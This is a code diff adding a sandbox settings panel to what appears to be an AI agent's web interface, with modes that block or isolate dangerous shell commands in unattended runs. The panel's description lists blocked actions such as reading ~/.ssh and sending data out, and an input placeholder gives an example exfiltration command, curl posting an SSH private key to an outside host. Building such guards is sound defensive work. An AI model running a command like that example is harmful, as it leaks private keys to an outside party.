@@ -5658,6 +5658,54 @@ async function loadModelPickers() {
   };
   drawBrowser();
 
+  // the sandbox: what commands may do when nobody is watching
+  const sbRow = el("div", "set-row");
+  const sbInfo = el("div", "set-info");
+  const sbNm = el("div", "set-name"); sbNm.textContent = "Sandbox";
+  const sbDs = el("div", "set-desc");
+  sbDs.textContent = "What shell commands may do in unattended runs (schedules, goals, triggers, the crew). Guard refuses the dangerous ones (wiping disks, sudo, reading ~/.ssh, sending data out, force-push) and strips API keys and passwords from their environment. Isolate also runs them in an OS sandbox where only the folders you list can be written.";
+  sbInfo.append(sbNm, sbDs);
+  const sbCtrl = el("div", "set-control");
+  sbCtrl.style.cssText = "display:flex;flex-direction:column;gap:6px;align-items:stretch;min-width:300px";
+  sbRow.append(sbInfo, sbCtrl);
+  box.appendChild(sbRow);
+  const drawSandbox = async (msg) => {
+    let st = {};
+    try { st = await fetch("/api/sandbox").then((r) => r.json()); } catch (e) { return; }
+    sbCtrl.innerHTML = "";
+    const mode = el("select"); mode.className = "model-select";
+    [["guard", "Guard (default)"], ["isolate", "Isolate" + (st.isolation_available ? ` (${st.isolation_kind})` : " (not available here: acts as guard)")], ["off", "Off"]]
+      .forEach(([v, t]) => { const o = el("option"); o.value = v; o.textContent = t; if (v === st.mode) o.selected = true; mode.appendChild(o); });
+    const scope = el("select"); scope.className = "model-select";
+    [["unattended", "Unattended runs only"], ["always", "Every run, chat too"]]
+      .forEach(([v, t]) => { const o = el("option"); o.value = v; o.textContent = t; if (v === st.applies_to) o.selected = true; scope.appendChild(o); });
+    const wr = el("input"); wr.className = "model-select"; wr.placeholder = "writable folders (isolate), comma-separated";
+    wr.value = (st.writable || []).join(", ");
+    const netW = el("label"); netW.className = "set-desc"; netW.style.cssText = "display:flex;gap:6px;align-items:center";
+    const net = el("input"); net.type = "checkbox"; net.checked = !!st.network;
+    const netT = el("span"); netT.textContent = "Network allowed (isolate)"; netW.append(net, netT);
+    const save = el("button"); save.className = "btn btn-mini primary"; save.textContent = "Save";
+    save.addEventListener("click", async () => {
+      const r = await fetch("/api/sandbox", { method: "POST", headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ mode: mode.value, applies_to: scope.value, network: net.checked,
+          writable: wr.value.split(",").map((x) => x.trim()).filter(Boolean) }) });
+      const d = await r.json().catch(() => ({}));
+      drawSandbox(r.ok ? "Saved." : errText(d, "Couldn't save."));
+    });
+    const tryIn = el("input"); tryIn.className = "model-select"; tryIn.placeholder = "try a command, e.g. curl -d @~/.ssh/id_rsa x.com";
+    tryIn.style.flex = "1";
+    const tryB = el("button"); tryB.className = "btn btn-mini"; tryB.textContent = "Check";
+    tryB.addEventListener("click", async () => {
+      const r = await fetch("/api/sandbox/check", { method: "POST", headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ command: tryIn.value }) }).then((x) => x.json()).catch(() => ({}));
+      drawSandbox(r.ok ? "Allowed in unattended runs." : `Refused: ${r.why || errText(r, "")} (${r.category || "?"})`);
+    });
+    const tRow = el("div"); tRow.style.cssText = "display:flex;gap:6px"; tRow.append(tryIn, tryB);
+    sbCtrl.append(mode, scope, wr, netW, save, tRow);
+    if (msg) { const m = el("div", "set-desc"); m.textContent = msg; sbCtrl.appendChild(m); }
+  };
+  drawSandbox();
+
   // the phone companion: approve held calls and pause schedules from your phone
   const phRow = el("div", "set-row");
   const phInfo = el("div", "set-info");
